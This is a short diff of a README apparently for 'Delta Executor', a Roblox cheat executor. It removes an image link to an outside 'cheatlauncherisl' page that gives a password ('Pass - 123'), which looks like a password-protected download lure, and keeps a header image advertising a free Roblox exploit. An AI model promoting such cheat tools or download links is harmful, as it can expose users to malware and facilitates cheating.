@@ -1,6 +1,3 @@
-[![image](https://github.com/NotWoman/Delta-Executor-Official/assets/166556874/7c2d8992-d756-4d19-9022-be34940d7dd6)](https://taplink.cc/cheatlauncherisl). / Pass - 123
-
-
 ![Delta Executor](https://gamingforecast.com/cdn-cgi/image/width=1280,height=720,fit=crop,quality=80,format=auto,onerror=redirect,metadata=none/wp-content/uploads/2022/04/roblox-delta-executor-free-exploit.jpg)
 
 <div align="center">
